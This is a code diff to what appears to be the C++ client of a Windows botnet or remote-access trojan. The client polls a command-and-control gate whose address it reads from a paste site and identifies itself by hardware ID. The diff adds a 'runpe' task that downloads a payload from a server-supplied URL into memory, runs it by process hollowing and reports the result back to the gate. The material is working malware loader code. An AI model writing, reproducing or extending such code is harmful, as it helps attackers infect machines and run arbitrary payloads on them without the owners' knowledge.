@@ -19,6 +19,7 @@
 #include "Helpers.hpp"
 #include "OsHelpers.hpp"
 #include "XOR.h"
+#include "spiderrun.h"
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
@@ -97,8 +98,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 				);
 				std::string responseFromGate = Helpers::responseToString(respons2e);
-				std::string substring = "dande";
-				if (responseFromGate.find(substring) != std::string::npos) {
+
+				if (responseFromGate.find("dande") != std::string::npos) {
 					//New task Found
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 					std::string random_str = Helpers::RandomString(10);
@@ -113,7 +114,24 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 						"&taskid=" + v[0],
 						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 					);
-				}
+				}else if (responseFromGate.find("runpe") != std::string::npos) {
+						//New task Found
+						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
+						std::string url(v[2]);
+						LPVOID FileData = DownloadURLToBuffer(url.c_str());
+						bool runned = NTRX_RUNPE32(FileData);
+						std::string started = "failed";
+						if(runned){
+							 started = "success";
+						}
+						http::Request request2(gateFromPatebin);
+						http::Response respons2e = request2.send("POST",
+							"hwid=" + guid +
+							"&taskstatus=" + started +
+							"&taskid=" + v[0],
+							{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
+						);
+					}
 				else {
 					if (responseFromGate.find("uninstall") != std::string::npos) {
 						//t1.detach();
